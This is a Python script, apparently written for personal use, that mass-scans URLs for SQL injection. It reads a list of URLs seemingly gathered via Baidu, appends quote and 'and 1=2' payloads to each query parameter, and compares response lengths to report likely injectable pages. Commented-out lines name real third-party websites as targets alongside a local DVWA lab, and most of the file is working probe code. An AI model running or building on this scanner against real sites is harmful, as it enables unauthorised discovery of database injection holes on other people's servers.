#Python3
# -*- coding:u8 -*-
#
from threading import Thread
#import urllib2
from os import path as ospath
from sys import path as syspath
parent_dir =  ospath.dirname(ospath.dirname(ospath.abspath(__file__)))
#脚本执行文件的上一级目录
syspath.append("%s/com"%parent_dir)
#添加公共目录
from user_agent_list import get_user_agent
import  urllib.request 
from queue import Queue
import socket
#通过套接字设置全局超时时间

class SQLiThread(Thread):
	def __init__(self,queue_url,END):
		Thread.__init__(self)
		self.queue_url = queue_url
		self.END = END
	def run(self):
		try:
			while not self.queue_url.empty() and not END[0]:
				str_url = self.queue_url.get_nowait()
				#print str_url
		except Exception as e:
			print (e)
		

from bs4 import BeautifulSoup as bs
def SQLiTester(url):
	'''
	测试URL是否有 level-1 SQL注入漏洞\n
	'''
	#tags = ['%27']
	tags = ['\'', '\' and 1=2', '\"', '\" and 1=2', 'e0and 1=2']#....etc
	#and sleep(1)
	lists = SQLiTestLists(url,tags)
	result_list_s = []
	for list in lists:
		result_list = []
		for url_test in list: 
			#print (url_test)
			try:
				request = urllib.request.Request(url_test)
				
				#proxies={'http://':'192.0.0.1:8080'}
				#proxy_support = urllib.request.ProxyHandler(proxies)
				opener = urllib.request.build_opener()
				response = opener.open(request)
				html = response.read()
				
				#soup = bs(html,'html.parser')
				#body = soup.find(name='body')
				#print ('len:%d'%len(html))
				#print (type(html))
				result_list.append(html)
			except Exception as e:
				#print (e)
				#print ('60')
				#return result_list
				continue
		result_list_s.append(result_list)
	return result_list_s

'''
#创建线程，并启动
def create_threads(threads_num,queue_read,url,extension,queue_write,loop_queue):
	threads = []
	for x in xrange(threads_num):
		#print x
		threads.append(cb_thread(END,queue_read,url,extension,queue_write,loop_queue))
	
	for t in threads:
		t.start()
'''

def getURL(queue_url):
	'''
	读取sqli
	'''
	fo = open('%s/com/sqli_baidu_url.txt'%parent_dir,'r')
	for item in fo:
		#print item.strip()
		queue_url.put(item.strip())
	fo.close()

def getSQLiPosition(url,position=0):
	position = url.find('&',position)
	return position
	
def SQLiTestLists(url,tags):
	'''
	将payload放入url
	'''
	position = 0
	tag_test_list_s = []
	in_for = False
	first = True
	while getSQLiPosition(url,position+1)>0 or first is True:
		
		tag_test_list = []
		for tag in tags:
			if  not in_for:
				position = getSQLiPosition(url,position+1)
				in_for = True
			if position < 0:
				first = False
				position = len(url)
			url_test = url[0:position] + tag + url[position:]
			tag_test_list.append(url_test)
		in_for = False
		tag_test_list_s.append(tag_test_list)
	return tag_test_list_s


def normalCheckURL(url):
	'''
	正常访问并获取body中的内容
	'''
	try:
		request = urllib.request.Request(url,headers={'User-Agent':get_user_agent()})
		opener = urllib.request.build_opener()
		response = opener.open(request)
		html = response.read()
		#soup = bs(html,'html.parser')
		#body = soup.find(name='body')
		#print (html)
		return html
	except urllib.error.HTTPError as e:
		#print (e)
		return None
	except urllib.error.URLError as e:
		#print (e)
		return None
	except Exception as e:
		#print (e)
		#print('118')
		return None

def stripOut(string):
	'''
	去掉 \\n \\t \\r space
	
	try:
		string.replace('\n','').replace('\t','').replace('r','').replace(' ','')
	except (NoneType,AttributeError) as e:
		#print (e)
		#print('129')
		print (string)
	finally:
		return string
	'''
	#return string.replace('\n','').replace('\t','').replace('r','').replace(' ','')
	return string

def distinguishString(normal,result_list_s):
	'''
	记录 normal body 与 test body的不同点，如何不同点相同则 不可取
	1.length
	2.char list
	
	'''
	len_normal = len(normal)
	#print (len_normal)
	#seq_list = 0
	for result_list in result_list_s:
		size = len(result_list)
		if size <0:
			continue
		#无内容继续
		len_same_count=0
		len_list = []
		len_list.append(len_normal)
		for test in result_list:
			len_test = len(test)
			
			if len_test == len_normal:
				len_same_count+=1
			len_list.append(len_test)
		if len_same_count == size:
			#print (len_same_count)
			#print (size)
			continue
		
		return distinguishStringDeeper(len_list)
		
		#测试页面长度都与normal length，retun 0
	return -1
def distinguishStringDeeper(len_list):
	len_normal=len_list[0]
	rate_low = 0.95
	rate_high = 1.04
	rate_ = 0.7
	for i in range(1,len(len_list)):
		rate = float(len_list[i])/float(len_list[0])
		if rate_low < rate and rate < rate_high:
			#print ('----- rate :%f-----'%rate)
			continue
		elif rate_ < rate:
			print ('----- rate :%f-----'%rate)
			return i
	return -1
	
		
	
if __name__ == '__main__':
	END = [False]#程序结束标志
	socket.setdefaulttimeout(10)
	queue_url = Queue()
	getURL(queue_url)
	
	'''
	threads_list = []
	threads_numner = 1
	for n in range(threads_numner):
		threads_list.append(SQLiThread(queue_url,END))
	for t in threads_list:
		t.start()
	'''
	##2.考虑将script style去掉
	#url='http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#'
	#url = 'https://www.amigo.cn/faq/content.php?id=181'
	
	#url ='http://www.spgykj.com/newsshow.php?id=12274'
	#url = 'http://skype-tom.com/goods.php?id=42'


	
	while not queue_url.empty():
		url = queue_url.get_nowait()
		#print (url)
		normal = normalCheckURL(url)
		normal = stripOut(normal)
		if normal is None:
			print ('None and exit')
			continue
		#print (hash(str))
		result_list_s = SQLiTester(url)
		
		result = distinguishString(normal,result_list_s)
		if  result is not None and result >=0:
			print ('[+]Possible : %s'%url)
	
	
	'''
	import time
	start = time.time()
	for result_list in result_list_s: 
		for result in result_list:
			digest = hashlib.md5()
			print ('-----------------')
			print (hash(result))
			digest.update(result.encode('utf8'))
			print (digest.hexdigest())
			#print (type(result))
			print (str==result)
			print ('+++++++++++++++++')
	stop = time.time()
	print ('handle string use time:%f'%(stop-start))
	
	except UnicodeEncodeError:
		print str.decode('utf8')
	SQLiTester(url)
	'''
